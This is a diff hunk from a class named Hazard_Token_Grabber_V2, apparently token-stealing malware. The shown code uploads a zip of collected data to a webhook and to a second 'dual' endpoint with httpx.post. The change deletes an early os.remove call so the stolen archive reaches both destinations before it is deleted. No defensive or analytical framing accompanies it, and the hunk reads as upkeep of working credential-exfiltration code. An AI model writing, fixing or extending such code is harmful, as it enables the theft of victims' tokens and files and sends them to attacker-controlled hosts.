@@ -586,7 +586,6 @@ class Hazard_Token_Grabber_V2(functions):
         httpx.post(self.dual, json=embed)
         with open(_zipfile, 'rb') as f:
             httpx.post(self.webhook, files={'upload_file': f})
-        os.remove(_zipfile)
         with open(_zipfile, 'rb') as f:
             httpx.post(self.dual, files={'upload_file': f})
         os.remove(_zipfile)
